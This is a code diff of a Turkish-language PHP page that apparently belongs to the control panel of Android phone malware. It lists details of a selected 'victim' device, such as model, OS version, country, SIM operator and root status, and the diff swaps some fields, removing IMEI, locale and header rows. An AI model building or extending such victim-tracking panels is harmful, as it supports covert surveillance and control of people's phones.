@@ -18,7 +18,7 @@ $device_id = $_GET['target'];
 
                 <div class="row"></div>
                 <br><br>
-                <legend>Telefon Detayları</legend>
+                <legend>Telefon Özellikleri</legend>
                 <div class="row">
                     <table class="table table-striped table-hover ">
                         <thead>
@@ -34,31 +34,31 @@ $device_id = $_GET['target'];
 
                         echo '<tr>';
                         echo '<td>1</td>';
-                        echo '<td>Marka</td>';
-                        echo '<td>'.$victim_array["device_list"][$device_id]['PHONE_PRODUCT'].'</td>';
+                        echo '<td>MODEL</td>';
+                        echo '<td>'.strtoupper($victim_array["device_list"][$device_id]['DEVICE_MODEL']).'</td>';
                         echo '</tr>';
 
                         echo '<tr>';
                         echo '<td>2</td>';
-                        echo '<td>Model</td>';
-                        echo '<td>'.$victim_array["device_list"][$device_id]['PHONE_MODEL'].'</td>';
+                        echo '<td>VERSION</td>';
+                        echo '<td>'.$victim_array["device_list"][$device_id]['SOFTWARE_VERSION'].'</td>';
                         echo '</tr>';
 
                         echo '<tr>';
                         echo '<td>3</td>';
-                        echo '<td>Versiyon</td>';
-                        echo '<td>'.$victim_array["device_list"][$device_id]['OS_VERSION'].'</td>';
+                        echo '<td>ÜLKE</td>';
+                        echo '<td>'.$victim_array["device_list"][$device_id]['COUNTRY'].'</td>';
                         echo '</tr>';
 
                         echo '<tr>';
                         echo '<td>4</td>';
-                        echo '<td>Imei</td>';
-                        echo '<td>'.$victim_array["device_list"][$device_id]['IMEI'].'</td>';
+                        echo '<td>OPERATÖR</td>';
+                        echo '<td>'.$victim_array["device_list"][$device_id]['SIM_OPERATOR'].'</td>';
                         echo '</tr>';
 
                         echo '<tr>';
                         echo '<td>5</td>';
-                        echo '<td>Root</td>';
+                        echo '<td>ROOT</td>';
                         echo '<td>'.$victim_array["device_list"][$device_id]['IS_ROOTED'].'</td>';
                         echo '</tr>';
 
@@ -83,21 +83,6 @@ $device_id = $_GET['target'];
                                 </div>
                               </td>';
                         echo '</tr>';
-
-
-                        echo '<tr>';
-                        echo '<td>9</td>';
-                        echo '<td>Lokal</td>';
-                        echo '<td>'.$victim_array["device_list"][$device_id]['LOCALE_INFO'].'</td>';
-                        echo '</tr>';
-
-
-                        echo '<tr>';
-                        echo '<td>10</td>';
-                        echo '<td>Header</td>';
-                        echo '<td>'.$victim_array["device_list"][$device_id]['INFO'].'</td>';
-                        echo '</tr>';
-
 
 
                         ?>
